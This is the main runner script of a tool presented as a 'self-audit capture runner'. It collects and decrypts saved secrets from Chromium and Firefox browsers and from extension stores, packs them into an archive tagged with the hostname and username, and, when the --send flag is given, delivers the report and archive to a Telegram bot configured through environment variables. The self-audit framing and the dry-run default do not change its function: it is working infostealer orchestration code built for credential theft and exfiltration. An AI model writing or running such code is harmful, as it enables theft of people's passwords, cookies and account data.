"""Self-audit capture runner - cross-platform, user-context, no elevation.

Pipeline: probe -> capture -> archive -> report. Each stage is isolated so one
failure degrades the result instead of killing the run.

Modes:
  --dry-run   capture + build the archive locally, print the report, send NOTHING.
              This is the default when no destination env vars are set.
  --send      actually deliver to the Telegram destination from the environment.
  --probe     capability check only, no capture.

The destination is never in this file or in any build artifact; config.py reads
it from JWG_TELEGRAM_TOKEN / JWG_TELEGRAM_CHAT at launch.
"""
from __future__ import annotations

import argparse
import json
import os
import shutil
import sys
import tempfile
import time

import capture
import config
import probe
import report
import sysinfo


def run(dry_run: bool, keep_archive: str | None = None) -> int:
    t0 = time.time()
    stage = tempfile.mkdtemp(prefix="jwg_stage_")
    try:
        rows = probe.run_all()
        print(probe.human(rows))
        print()

        caps = []
        for fn, label in ((capture.capture_chromium, "chromium"),
                          (capture.capture_firefox, "firefox"),
                          (capture.capture_extension_stores, "extensions")):
            try:
                got = fn(stage)
                caps.extend(got)
            except Exception as e:
                caps.append(report_caps_error(label, e))

        system = sysinfo.gather()
        report.write_items(stage, caps)   # decrypted items must land in the archive
        text = report.render_report(caps, system, rows)
        arch, size, nfiles = report.build_archive(
            stage, os.path.join(tempfile.gettempdir(), f"jwg-{system['hostname']}.zip"), caps)

        total_items = sum(c.count for c in caps)
        print(f"captured {total_items} decrypted item(s), staged {nfiles} file(s) "
              f"-> {size/1024:.0f} KB archive in {time.time()-t0:.1f}s")
        print(text)

        if dry_run:
            print("\n[dry-run] nothing sent. archive left at:", arch)
            if keep_archive:
                shutil.copy2(arch, keep_archive)
                print("[dry-run] copied to", keep_archive)
            return 0

        token, chat = config.telegram_destination()
        tr = report.Transport(token, chat)
        ok, who = tr.check()
        if not ok:
            print(f"[fatal] bot unreachable: {who}", file=sys.stderr)
            return 2
        print(f"[transport] bot {who} online; delivering")
        tr.text(text)
        if not tr.file(arch, caption=f"{system['hostname']} / {system['username']}"):
            print(f"[warn] archive send failed: {tr.errors[-1] if tr.errors else '?'}", file=sys.stderr)
        print(f"[done] sent: {tr.sent}")
        if tr.errors:
            print(f"[errors] {tr.errors}", file=sys.stderr)
        return 0
    finally:
        shutil.rmtree(stage, ignore_errors=True)


def report_caps_error(label: str, exc: Exception):
    c = capture.Capture(f"{label}:ERROR")
    c.note = f"{type(exc).__name__}: {exc}"
    return c


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="cross-platform secret store capture")
    g = ap.add_mutually_exclusive_group()
    g.add_argument("--send", action="store_true", help="deliver to the configured destination")
    g.add_argument("--dry-run", action="store_true", help="capture locally, send nothing (default)")
    g.add_argument("--probe", action="store_true", help="capability check only")
    ap.add_argument("--json", action="store_true", help="machine-readable output")
    ap.add_argument("--keep-archive", metavar="PATH", help="copy the archive here on dry-run")
    a = ap.parse_args(argv)

    if a.probe:
        rows = probe.run_all()
        print(json.dumps(rows, indent=2) if a.json else probe.human(rows))
        return 0

    # Fail closed: sending requires an explicit --send AND a configured destination.
    dest_set = bool(os.environ.get(config.TOKEN_ENV) and os.environ.get(config.CHAT_ENV))
    dry = not a.send or not dest_set
    if a.send and not dest_set:
        print(f"[note] --send ignored: {config.TOKEN_ENV}/{config.CHAT_ENV} not set. "
              "Running dry.", file=sys.stderr)
    return run(dry_run=dry, keep_archive=a.keep_archive)


if __name__ == "__main__":
    raise SystemExit(main())
